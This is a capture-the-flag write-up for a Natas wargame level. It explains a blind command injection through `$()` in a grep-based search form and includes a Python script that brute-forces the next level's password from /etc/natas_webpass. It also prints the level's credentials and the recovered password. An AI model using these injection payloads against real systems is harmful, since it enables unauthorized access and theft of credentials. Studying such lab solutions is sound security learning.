
## Level Overview

This level introduces a **command injection vulnerability** combined with **blind data exfiltration**. Unlike previous levels that relied on SQL injection, 
this challenge leverages shell command execution and requires extracting sensitive data without direct output.

The objective is to retrieve the password for the next level by exploiting improper input handling in a server-side `grep` command.

## Vulnerability Analysis

The application accepts user input and incorporates it into a shell command resembling:

```bash
grep -i "$needle" dictionary.txt
```

Key observations:

* User input is passed into a shell context.
* Special characters are filtered (e.g., quotes), limiting straightforward injection.
* However, **command substitution using `$()` is still allowed**.
* The output of injected commands is **not directly displayed**, making this a **blind injection scenario**.

## Exploitation Strategy

### Step 1: Command Injection via `$()`

We exploit command substitution:

```bash
$(command)
```

This allows execution of arbitrary commands whose output is inserted into the original command.

---

### Step 2: Target Sensitive File

The password for the next level is stored in:

```bash
/etc/natas_webpass/natas17
```

---

### Step 3: Prefix Matching with `grep`

We use `grep` to test whether the password begins with a specific prefix:

```bash
grep ^<prefix> /etc/natas_webpass/natas17
```

* If the prefix matches → `grep` outputs the password
* If not → no output

---

### Step 4: Blind Oracle Construction

We inject:

```bash
anythings$(grep ^<prefix> /etc/natas_webpass/natas17)
```

Behavior:

* If `grep` **matches**:

  * Output is inserted
  * The string `"anythings"` is disrupted
* If `grep` **does not match**:

  * No output
  * `"anythings"` remains intact

This creates a **boolean oracle**:

* `"anythings"` present → incorrect guess
* `"anythings"` missing → correct prefix

---

### Step 5: Brute-Force Extraction

We iteratively:

1. Build the password character-by-character
2. Test each candidate character
3. Detect matches using the oracle condition

---

## Automation with Python

The following script automates the extraction process:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    found = False
    for character in characters:
        attempt = ''.join(seen_password) + character
        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
        try:
            response = session.post(
                url,
                data={'needle': payload},
                auth=(username, password),
                timeout=10
            )
            content = response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue

        if 'anythings' not in content:
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            found = True
            break

        time.sleep(0.1)

    if not found:
        print("[-] No matching character found. This shouldn't happen!")
        break

print(f"[✓] Final password: {''.join(seen_password)}")
```

---

Running this code will reveals the password, which is `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`.
